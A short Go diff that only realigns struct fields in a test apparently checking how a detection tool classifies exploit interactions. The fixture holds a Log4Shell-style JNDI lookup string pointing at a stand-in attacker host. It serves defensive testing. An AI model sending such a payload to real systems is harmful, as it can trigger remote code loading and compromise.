@@ -74,8 +74,8 @@ func TestMatchTemplateInteraction_PreservesExistingExploitType(t *testing.T) {
 	existingConfidence := "high"
 	domain := "${jndi:ldap://evil.com}"
 	inter := &models.Interaction{
-		Type:       "dns",
-		Domain:     &domain,
+		Type:        "dns",
+		Domain:      &domain,
 		ExploitType: &existingType,
 		Confidence:  &existingConfidence,
 	}
